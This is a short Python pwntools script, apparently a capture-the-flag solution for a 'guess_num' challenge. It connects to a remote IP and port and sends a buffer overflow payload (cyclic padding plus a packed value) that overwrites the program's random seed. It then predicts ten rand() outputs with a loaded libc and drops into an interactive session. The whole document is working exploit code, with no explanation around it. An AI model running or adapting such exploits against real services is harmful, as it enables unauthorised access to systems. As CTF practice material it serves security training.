from pwn import *
from ctypes import *

# sh = process("./guess_num")
sh = remote("61.147.171.105", 55311)
libc = cdll.LoadLibrary("./libc.so.6")

payload = cyclic(0x20) + p64(1)
libc.srand(1)
sh.sendlineafter("name:", payload)
for i in range(10):
    sh.sendlineafter("number:", str(libc.rand()%6+1))
sh.interactive()


